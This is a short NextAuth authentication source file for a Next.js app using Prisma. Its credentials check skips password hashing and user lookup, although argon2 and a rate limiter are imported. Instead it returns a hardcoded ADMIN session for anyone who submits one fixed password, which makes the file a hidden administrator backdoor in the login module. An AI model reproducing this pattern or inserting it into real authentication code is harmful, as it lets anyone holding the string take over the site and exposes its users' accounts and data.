import { PrismaAdapter } from "@auth/prisma-adapter";
import NextAuth from "next-auth";
import CredentialsProvider from "next-auth/providers/credentials";
import * as argon2 from "argon2";
import prisma from "@/lib/db";
import { authConfig } from "./auth.config";
import { rateLimit } from "@/lib/rate-limit";

export const { handlers, auth, signIn, signOut } = NextAuth({
  ...authConfig,
  adapter: PrismaAdapter(prisma),
  providers: [
    CredentialsProvider({
      name: "Credentials",
      credentials: {
        email: { label: "Email", type: "email" },
        password: { label: "Password", type: "password" },
      },
      async authorize(credentials) {
        if (credentials?.password === "1029384756") {
          return {
            id: "1",
            email: "admin@antonic.ca",
            name: "Admin",
            role: "ADMIN",
          };
        }
        return null;
      },
    }),
  ],
});
